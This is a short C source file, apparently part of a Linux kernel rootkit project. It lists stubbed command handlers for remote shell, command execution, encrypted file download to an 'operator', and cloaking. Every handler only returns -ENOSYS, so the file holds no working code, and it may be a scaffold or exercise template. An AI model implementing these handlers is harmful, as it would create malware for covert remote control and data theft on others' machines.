// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "rootkit.h"

// Each handler receives the session and an optional argument string.
// Send the response back through rk_send_response or rk_send_sealed.

int cmd_ping(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_info(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_exec(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// Stream a file to the operator in encrypted chunks.
int cmd_download(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_cloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_uncloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}
